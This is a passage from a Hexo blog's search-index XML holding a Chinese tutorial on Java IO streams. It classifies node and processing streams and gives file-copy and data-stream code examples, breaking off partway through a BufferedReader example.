      
        <tags>
            
            <tag> java </tag>
            
            <tag> Path和Files </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA IO流总结</title>
      <link href="/archives/a068fc76.html"/>
      <url>/archives/a068fc76.html</url>
      
        <content type="html"><![CDATA[<p>转载自：</p><ol><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NuYWlsY2xpbWIvSmF2YUd1aWRlL2Jsb2IvbWFzdGVyL2RvY3MvamF2YS9KYXZhJUU1JTlGJUJBJUU3JUExJTgwJUU3JTlGJUE1JUU4JUFGJTg2Lm1kIzM1LWphdmEtJUU0JUI4JUFELWlvLSVFNiVCNSU4MQ==" title="https://github.com/Snailclimb/JavaGuide/blob/master/docs/java/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.md#35-java-%E4%B8%AD-io-%E6%B5%81">Java基础知识<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81ZDRlZTczYWU1MWQ0NTYxYzk0YjBmOWQ=" title="https://juejin.im/post/5d4ee73ae51d4561c94b0f9d">java I/O流详解<i class="fa fa-external-link"></i></span></li></ol><h3 id="Java-中-IO-流分为几种"><a href="#Java-中-IO-流分为几种" class="headerlink" title="Java 中 IO 流分为几种?"></a>Java 中 IO 流分为几种?</h3><ul><li>从流的方向划分：分为 <code>输入流</code>， <code>输出流</code></li><li>从流的传输单位划分： 分为 <code>字节流</code>（8位字节），<code>字符流</code>（16位的字符）</li><li>从流的角色划分： 分为 <code>节点流</code>，<code>处理流</code><ul><li>节点流是直接连接<code>数据源</code>的流，可以<code>直接向数据源（特定的IO设备，如硬盘，网络，其他程序）读写数据</code>。</li><li>处理流通过<code>构造方法接收一个节点流</code>，对节点流使用<code>装饰者模式</code>增加更多的功能，处理流<code>必须依赖于一个节点流</code>，因为只有节点流最终可以将数据流输入输出到IO设备中。</li></ul></li></ul><a id="more"></a><p>Java Io 流共涉及 40 多个类，这些类看上去很杂乱，但实际上很有规则，而且彼此之间存在非常紧密的联系， Java I0 流的 40 多个类都是从如下 4 个抽象类基类中派生出来的。</p><ul><li>InputStream/Reader: 所有的输入流的基类，前者是字节输入流，后者是字符输入流。</li><li>OutputStream/Writer: 所有输出流的基类，前者是字节输出流，后者是字符输出流。</li></ul><p>按操作方式分类结构图：</p><p><img data-src="https://pic.downk.cc/item/5e604d9498271cb2b85af6ee.jpg"></p><p>按操作对象分类结构图：</p><p><img data-src="https://pic.downk.cc/item/5e604db798271cb2b85b0aef.jpg"></p><p>这里再解释一下“节点流”和“处理流”：</p><h3 id="节点流–直接连接数据源的流"><a href="#节点流–直接连接数据源的流" class="headerlink" title="节点流–直接连接数据源的流"></a>节点流–直接连接数据源的流</h3><p><img data-src="https://ae01.alicdn.com/kf/Hed5828b4792e48b198efef07eaf06183m.jpg"></p><h3 id="常见的节点流"><a href="#常见的节点流" class="headerlink" title="常见的节点流"></a>常见的节点流</h3><p><img data-src="https://pic.downk.cc/item/5e604eab98271cb2b85b3407.jpg"></p><ol><li>File 文件流。对文件进行读、写操作 ：FileReader、FileWriter、FileInputStream、FileOutputStream。</li><li>从/向内存数组读写数据: CharArrayReader与 CharArrayWriter、ByteArrayInputStream与ByteArrayOutputStream。</li><li>从/向内存字符串读写数据 StringReader、StringWriter、StringBufferInputStream。</li><li>Pipe管道流。 实现管道的输入和输出（进程间通信）: PipedReader与PipedWriter、PipedInputStream与PipedOutputStream。</li></ol><h3 id="处理流–连接已存在的流"><a href="#处理流–连接已存在的流" class="headerlink" title="处理流–连接已存在的流"></a>处理流–连接已存在的流</h3><p><img data-src="https://pic.downk.cc/item/5e604ee398271cb2b85b3d71.jpg"></p><h3 id="常见的处理流"><a href="#常见的处理流" class="headerlink" title="常见的处理流"></a>常见的处理流</h3><p><img data-src="https://pic.downk.cc/item/5e604ef298271cb2b85b3fed.jpg"></p><ol><li>Buffering缓冲流：在读入或写出时，对数据进行缓存，以减少I/O的次数：BufferedReader与BufferedWriter、BufferedInputStream与BufferedOutputStream。</li><li>Filtering 滤流：在数据进行读或写时进行过滤：FilterReader与FilterWriter、FilterInputStream与FilterOutputStream。</li><li>Converting between Bytes and Characters 转换流：按照一定的编码/解码标准将字节流转换为字符流，或进行反向转换（Stream到Reader）：InputStreamReader、OutputStreamWriter。</li><li>Object Serialization 对象流 ：ObjectInputStream、ObjectOutputStream。</li><li>DataConversion数据流： 按基本数据类型读、写（处理的数据是Java的基本类型（如布尔型，字节，整数和浮点数））：DataInputStream、DataOutputStream 。</li><li>Counting计数流： 在读入数据时对行记数 ：LineNumberReader、LineNumberInputStream。</li><li>Peeking Ahead预读流： 通过缓存机制，进行预读 ：PushbackReader、PushbackInputStream。  8 .Printing打印流： 包含方便的打印方法 ：PrintWriter、PrintStream。</li></ol><h3 id="FileInputStream-amp-FileOutputStream"><a href="#FileInputStream-amp-FileOutputStream" class="headerlink" title="FileInputStream &amp; FileOutputStream"></a>FileInputStream &amp; FileOutputStream</h3><ol><li>FileInputStream &amp; FileOutputStream 可以从文件系统中 读取/写入 诸如图像数据之类的原始字节流。</li><li>以下是 使用 FileInputStream &amp; FileOutputStream 实现文件拷贝的案例</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用文件字节流 一次拷贝一个字节</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copyFile1</span><span class="params">(String src, String dest)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1. 创建流</span></span><br><span class="line">        InputStream in = <span class="keyword">new</span> FileInputStream(src);</span><br><span class="line">        OutputStream os = <span class="keyword">new</span> FileOutputStream(dest);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 读写数据</span></span><br><span class="line">        <span class="keyword">int</span> data = in.read();</span><br><span class="line">        <span class="keyword">while</span> (data != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(data);</span><br><span class="line">            data = in.read();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3. 关闭流</span></span><br><span class="line">        in.close();</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用文件字节流 一次拷贝一个字节数组</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copyFile2</span><span class="params">(String src, String dest)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1. 创建流</span></span><br><span class="line">        InputStream in = <span class="keyword">new</span> FileInputStream(src);</span><br><span class="line">        OutputStream os = <span class="keyword">new</span> FileOutputStream(dest);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 读写数据</span></span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        <span class="keyword">int</span> len = in.read(buffer);</span><br><span class="line">        <span class="keyword">while</span> (len != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            len = in.read(buffer);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3. 关闭流</span></span><br><span class="line">        in.close();</span><br><span class="line">        os.close();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="DataInputStream-amp-DataOutputStream"><a href="#DataInputStream-amp-DataOutputStream" class="headerlink" title="DataInputStream &amp; DataOutputStream"></a>DataInputStream &amp; DataOutputStream</h3><ol><li>DataInputStream &amp; DataOutputStream，是处理流，改构造方法接收一个已存在的输入输出流， 允许程序从读取方便快捷 操作java的基本数据类型。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 向文件中写入 java基本数据类型</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(String dest)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1. 创建流对象</span></span><br><span class="line">        DataOutputStream os = <span class="keyword">new</span> DataOutputStream(<span class="keyword">new</span> FileOutputStream(dest));</span><br><span class="line">        <span class="comment">//2. 写入数据</span></span><br><span class="line">        os.writeInt(<span class="number">10</span>);</span><br><span class="line">        os.writeChar(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        os.writeChar(<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">        os.writeDouble(<span class="number">12.83</span>);</span><br><span class="line">        <span class="comment">//3. 关闭流</span></span><br><span class="line">        os.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从文件中读取 java基本数据类型，要和写入的顺序保持一致</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">read</span><span class="params">(String src)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1. 创建数据流对象</span></span><br><span class="line">        DataInputStream in = <span class="keyword">new</span> DataInputStream(<span class="keyword">new</span> FileInputStream(src));</span><br><span class="line">        <span class="comment">//2. 读取数据</span></span><br><span class="line">        <span class="keyword">int</span> a = in.readInt();</span><br><span class="line">        <span class="keyword">char</span> b = in.readChar();</span><br><span class="line">        <span class="keyword">char</span> c = in.readChar();</span><br><span class="line">        <span class="keyword">double</span> d = in.readDouble();</span><br><span class="line">        <span class="comment">//3. 关闭流</span></span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="BufferedInputStream-amp-BufferedOutputStream"><a href="#BufferedInputStream-amp-BufferedOutputStream" class="headerlink" title="BufferedInputStream &amp; BufferedOutputStream"></a>BufferedInputStream &amp; BufferedOutputStream</h3><ol><li>BufferedInputStream &amp; BufferedOutputStream 为另一个输入输出流流添加一些功能，即缓冲区的作用。在创建 BufferedInputStream &amp; BufferedOutputStream 时，会创建一个内部缓冲区数组。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为文件字节流 添加缓冲区功能， 一次读写一个字节数据，但内部缓冲区数组已经填满</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copyFile1</span><span class="params">(String src, String dest)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1. 创建流</span></span><br><span class="line">        InputStream in = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(src));</span><br><span class="line">        OutputStream os = <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(dest));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 读写数据</span></span><br><span class="line">        <span class="keyword">int</span> data = in.read();</span><br><span class="line">        <span class="keyword">while</span> (data != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(data);</span><br><span class="line">            data = in.read();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3. 关闭流</span></span><br><span class="line">        in.close();</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为文件字节流 添加缓冲区功能， 一次读写一个字节数组数据，但内部缓冲区数组已经填满</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copyFile2</span><span class="params">(String src, String dest)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1. 创建流</span></span><br><span class="line">        InputStream in = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(src));</span><br><span class="line">        OutputStream os = <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(dest));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 读写数据</span></span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        <span class="keyword">int</span> len = in.read(buffer);</span><br><span class="line">        <span class="keyword">while</span> (len != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            len = in.read(buffer);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3. 关闭流</span></span><br><span class="line">        in.close();</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="PrintStream"><a href="#PrintStream" class="headerlink" title="PrintStream"></a>PrintStream</h3><ol><li>PrintStream 为其他输出流添加了功能，使它们能够方便地打印各种数据值表示形式。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        PrintStream ps = <span class="keyword">new</span> PrintStream(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">        ps.println(<span class="number">5</span>);</span><br><span class="line">        ps.print(<span class="string">&quot;Aaaa&quot;</span>);</span><br><span class="line">        ps.print(<span class="keyword">false</span>);</span><br><span class="line">        ps.println(<span class="string">&quot;hahah&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ps.flush();</span><br><span class="line">        ps.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ByteArrayInputStream-amp-ByteArrayOutputStream"><a href="#ByteArrayInputStream-amp-ByteArrayOutputStream" class="headerlink" title="ByteArrayInputStream &amp; ByteArrayOutputStream"></a>ByteArrayInputStream &amp; ByteArrayOutputStream</h3><p>ByteArrayInputStream &amp; ByteArrayInputStream 包含一个内部缓冲区(实际上就是把数据写入内存，然后再读取)，该缓冲区包含从流中读取的字节。内部计数器跟踪 read 方法要提供的下一个字节。</p><p>有人说这种写入到内存又读到内存的意义是什么，举个不常用的例子，假设我们对一个对象进行序列化，当从序列化后的文件中读回时，我们可以得到这个对象的深拷贝，但是如果写入到文件的话就会特别耗时，这时采用这ByteArrayOuputStream就可以把序列化写入到内存中，这样速度就会加快很多了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1. 写入数据</span></span><br><span class="line">        ByteArrayOutputStream os = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        os.write(<span class="string">&quot;hello&quot;</span>.getBytes());</span><br><span class="line">        os.close(); <span class="comment">// 没有写任何实现</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 读取输出</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = os.toByteArray();</span><br><span class="line">        ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1014</span>];</span><br><span class="line">        <span class="keyword">int</span> len = in.read(data);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(data, <span class="number">0</span> ,len));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="InputStreamReader-amp-OutputStreamWriter"><a href="#InputStreamReader-amp-OutputStreamWriter" class="headerlink" title="InputStreamReader &amp; OutputStreamWriter"></a>InputStreamReader &amp; OutputStreamWriter</h3><p>这两个比较特殊，它是字符流和字节流之间的桥梁，先看看官网是如何描述它们的吧：</p><blockquote><p>An InputStreamReader is a bridge from byte streams to character streams: It reads bytes and decodes them into characters using a specified <a href="https://devdocs.io/openjdk~8/java/nio/charset/charset"><code>charset</code></a>. The charset that it uses may be specified by name or may be given explicitly, or the platform’s default charset may be accepted.</p><p>Each invocation of one of an InputStreamReader’s read() methods may cause one or more bytes to be read from the underlying byte-input stream. To enable the efficient conversion of bytes to characters, more bytes may be read ahead from the underlying stream than are necessary to satisfy the current read operation.</p><p>For top efficiency, consider wrapping an InputStreamReader within a BufferedReader. For example:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BufferedReader in</span><br><span class="line">   = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in)); <span class="comment">// 这也是从控制台读入数据的第二种方法，第一种是使用Scanner类</span></span><br></pre></td></tr></table></figure></blockquote><p>这就是说，InputStreamReader/OutputStreamWriter可以将字节流的读写转化为字符流的读写。只要我们提供一个指定的charset即可（当然它有默认的charset的）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 字符转换流， 实现文本文件的 拷贝</span></span><br><span class="line">    <span class="comment">// 一次拷贝一个 字符</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copyFile1</span><span class="params">(String src, String dest)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1. 创建转换流</span></span><br><span class="line">        Reader reader = <span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(src));</span><br><span class="line">        Writer writer = <span class="keyword">new</span> OutputStreamWriter(<span class="keyword">new</span> FileOutputStream(dest));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 拷贝数据</span></span><br><span class="line">        <span class="keyword">int</span> data = reader.read();</span><br><span class="line">        <span class="keyword">while</span> (data != -<span class="number">1</span>) &#123;</span><br><span class="line">            writer.write(data);</span><br><span class="line">            data = reader.read();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3.关闭流</span></span><br><span class="line">        reader.close();</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一次拷贝一个 字符数组</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copyFile2</span><span class="params">(String src, String dest)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1. 创建转换流</span></span><br><span class="line">        Reader reader = <span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(src));</span><br><span class="line">        Writer writer = <span class="keyword">new</span> OutputStreamWriter(<span class="keyword">new</span> FileOutputStream(dest));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 拷贝数据</span></span><br><span class="line">        <span class="keyword">char</span>[] buffer = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2048</span>];</span><br><span class="line">        <span class="keyword">int</span> len = reader.read(buffer);</span><br><span class="line">        <span class="keyword">while</span> (len != -<span class="number">1</span>) &#123;</span><br><span class="line">            writer.write(buffer, <span class="number">0</span> , len);</span><br><span class="line">            len = reader.read(buffer);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3.关闭流</span></span><br><span class="line">        reader.close();</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="FileReader-amp-FileWriter"><a href="#FileReader-amp-FileWriter" class="headerlink" title="FileReader &amp; FileWriter"></a>FileReader &amp; FileWriter</h3><p>在只针对将字符写入文件的时候，因为 每次使用 转换流，对字节流进行包装，写法太麻烦，所以jdk 提供了 字节转换流子类FileReader &amp; FileWriter，方便的进行字符文件的IO操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 字符转换流， 实现文本文件的 拷贝</span></span><br><span class="line">    <span class="comment">// 一次拷贝一个 字符</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copyFile1</span><span class="params">(String src, String dest)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1. 创建转换流</span></span><br><span class="line">        Reader reader = <span class="keyword">new</span> FileReader(src);</span><br><span class="line">        Writer writer = <span class="keyword">new</span> FileWriter(dest);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 拷贝数据</span></span><br><span class="line">        <span class="keyword">int</span> data = reader.read();</span><br><span class="line">        <span class="keyword">while</span> (data != -<span class="number">1</span>) &#123;</span><br><span class="line">            writer.write(data);</span><br><span class="line">            data = reader.read();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3.关闭流</span></span><br><span class="line">        reader.close();</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一次拷贝一个 字符数组</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copyFile2</span><span class="params">(String src, String dest)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1. 创建转换流</span></span><br><span class="line">        Reader reader = <span class="keyword">new</span> FileReader(src);</span><br><span class="line">        Writer writer = <span class="keyword">new</span> FileWriter(dest);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 拷贝数据</span></span><br><span class="line">        <span class="keyword">char</span>[] buffer = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2048</span>];</span><br><span class="line">        <span class="keyword">int</span> len = reader.read(buffer);</span><br><span class="line">        <span class="keyword">while</span> (len != -<span class="number">1</span>) &#123;</span><br><span class="line">            writer.write(buffer, <span class="number">0</span> , len);</span><br><span class="line">            len = reader.read(buffer);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3.关闭流</span></span><br><span class="line">        reader.close();</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="BufferedReader-amp-BufferedWriter"><a href="#BufferedReader-amp-BufferedWriter" class="headerlink" title="BufferedReader &amp; BufferedWriter"></a>BufferedReader &amp; BufferedWriter</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一次拷贝一个 字符</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copyFile1</span><span class="params">(String src, String dest)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1. 创建转换流</span></span><br><span class="line">        Reader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(src));</span><br><span class="line">        Writer writer = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(dest));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 拷贝数据</span></span><br><span class="line">        <span class="keyword">int</span> data = reader.read();</span><br><span class="line">        <span class="keyword">while</span> (data != -<span class="number">1</span>) &#123;</span><br><span class="line">            writer.write(data);</span><br><span class="line">            data = reader.read();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3.关闭流</span></span><br><span class="line">        reader.close();</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一次拷贝一个 字符数组</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copyFile2</span><span class="params">(String src, String dest)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1. 创建转换流</span></span><br><span class="line">        Reader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(src));</span><br><span class="line">        Writer writer = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(dest));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 